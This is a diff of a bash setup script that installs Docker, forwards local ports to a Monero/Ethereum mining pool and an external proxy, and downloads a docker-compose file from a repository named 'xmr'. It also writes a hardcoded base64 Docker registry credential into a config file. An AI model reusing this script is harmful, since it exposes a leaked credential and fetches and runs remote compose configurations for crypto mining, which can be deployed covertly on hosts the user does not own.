@@ -1,13 +1,12 @@
 #!/bin/bash
 cd /home/ubuntu/
-mkdir .docker
 sudo apt-get update
 sudo apt-get install -y docker.io docker-compose redir
 sudo redir :1233 eth-asia1.nanopool.org:9433
 git clone https://github.com/azpanel/azpanel.git
 git clone https://github.com/assimon/dujiaoka.git
-mkdir .docker && mkdir docker && touch .docker/config.json && cd docker 
-echo '{"auths": {"registry.cn-zhangjiakou.aliyuncs.com": {"auth": "eXVoZW5nQDE5NjMyMjYyNjQ1ODMyMjM6TEx+P1dRMiRkTil5cA=="}},"HttpHeaders": {"User-Agent": "Docker-Client/19.03.11-ce (linux)"}}' > ~/home/ubuntu/.docker/config.json
+mkdir docker .docker && cd docker 
+echo '{"auths": {"registry.cn-zhangjiakou.aliyuncs.com": {"auth": "eXVoZW5nQDE5NjMyMjYyNjQ1ODMyMjM6TEx+P1dRMiRkTil5cA=="}},"HttpHeaders": {"User-Agent": "Docker-Client/19.03.11-ce (linux)"}}' > ~/.docker/config.json
 wget https://raw.githubusercontent.com//henglxm/xmr/main/docker-compose.yml
 
 sudo redir :9003 proxy.proxyguys.com:9003
